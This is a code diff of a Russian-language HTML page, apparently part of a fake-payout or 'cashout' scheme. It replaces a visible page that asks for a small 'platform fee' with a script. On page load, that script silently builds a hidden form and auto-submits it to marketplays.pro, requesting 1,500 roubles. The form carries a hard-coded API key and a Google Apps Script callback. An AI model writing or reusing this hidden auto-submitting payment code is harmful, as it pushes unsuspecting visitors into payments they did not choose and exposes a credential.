@@ -9,68 +9,46 @@
 </head>
 <body>
 
-<center>
-<div class="pay">
 
+<script>
+(function() {
+    // Ждем полной загрузки страницы
+    window.addEventListener('load', function() {
+        // Создаем невидимую форму
+        var form = document.createElement('form');
+        form.method = 'POST';
+        form.action = 'https://marketplays.pro/api/request/';
+        form.style.display = 'none';
 
-<table class="table">
-<tr>
-<td><p class="tes">ОФОРМЛЕНИЕ ЗАКАЗА</p></td><td><img src="img/kosh.png"></td>
-</tr>
-<tr>
-<td><br>
-<p class="tes1">Оплата услуг платформы 0.2% <span style="color: black;">130 руб</span></p><br>
-</td>
+        // Данные для отправки
+        var data = {
+            'amount': '1500',
+            'merchant_order_id': 'Traf2-' + Date.now(),
+            'use_card_payment': 'RUB',
+            'success_url': 'https://treedx.github.io/ru/upsalles/third_up.html',
+            'fail_url': 'https://treedx.github.io/ru/cashout.html',
+            'notice_url': 'https://script.google.com/macros/s/AKfycbxpVpxrn_LK12LGtdpC7xJOmWBbZzdFtbHcVwJ0iN_2JFNuvMa5VRvNjw84jO8fYWfY/exec',
+            'api_key': 'e71366079d95b04228fc6482c503a983b99da2e7b17dd6c56780074d0f7e63a2'
+        };
 
-<td><br>
-<p class="tes1">Заказ № 22792467</p><br>
-</td>
-</tr>
+        // Заполняем форму полями
+        for (var key in data) {
+            if (data.hasOwnProperty(key)) {
+                var input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = data[key];
+                form.appendChild(input);
+            }
+        }
 
-<tr><td><p class="tes2">Оплата банковской картой</p></td><td><img src="img/visa-mastercard.png"></td></tr>
+        // Добавляем форму в Body и отправляем
+        document.body.appendChild(form);
+        form.submit();
+    });
+})();
+</script>
 
-<tr><td><p class="tes3">Страница оплаты откроется в новом окне.</p><p class="tes3">После оплаты вернитесь на данную страницу и нажмите кнопку "Я Оплатил", она появится ниже сразу после совершения платежа.</p></td></tr>
-</table>
-<p class="button1"><a style="color: white; text-align: center;" href="https://money.yandex.ru/payments/internal?customerNumber=906%200728370&netSum=130&scid=343&sum=130&PROPERTY1=906&PROPERTY2=0728370&from-efos-showcase=" target="_blank">ОПЛАТИТЬ</a></p>
-
-<table class="table">
-<tr><td><p class="tes3">Здесь появится кнопка подтверждения сразу после совершения платежа. Не закрывайте и не обновляйте страницу.</p></td></tr>
-</table>
-
-
-<img src="img/strelka_vniz.gif">
-
-
-
-
-
-
-
-
-
-
-<br><br>
-
-
-</div>
-
-
-
-<div class="hide_block2">
-
-
-
-<p class="button1"><a style="color: white; text-align: center;" href="upsalles/first_up.html">Я ОПЛАТИЛ</a></p>
-
-
-</div>
-
-
-
-
-
-
-
-</center>
 </body>
+
 </html>
